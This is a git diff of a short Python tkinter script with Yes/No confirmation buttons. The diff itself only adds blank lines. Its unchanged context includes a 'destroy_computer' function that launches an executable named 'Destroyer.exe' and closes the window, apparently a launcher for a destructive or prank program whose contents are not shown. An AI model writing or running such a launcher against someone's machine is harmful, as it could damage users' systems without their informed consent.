@@ -1,6 +1,7 @@
 import tkinter as tk
 import os
 
+
 def delete_text():
     h1_label.pack_forget()
     h3_label.pack_forget()
@@ -21,15 +22,18 @@ def delete_text():
     confirm_no_button = tk.Button(confirm_button_frame, text="No", font=("Helvetica", 18), width=10, fg="black", border=0, command=window.destroy)
     confirm_no_button.pack(side=tk.LEFT, padx=20)
 
+
 def destroy_computer():
     os.startfile("Destroyer.exe")
     window.destroy()
+
 
 def handle_button_click(button_text):
     if button_text == "No":
         window.destroy()
     elif button_text == "Yes":
         delete_text()
+
 
 window = tk.Tk()
 
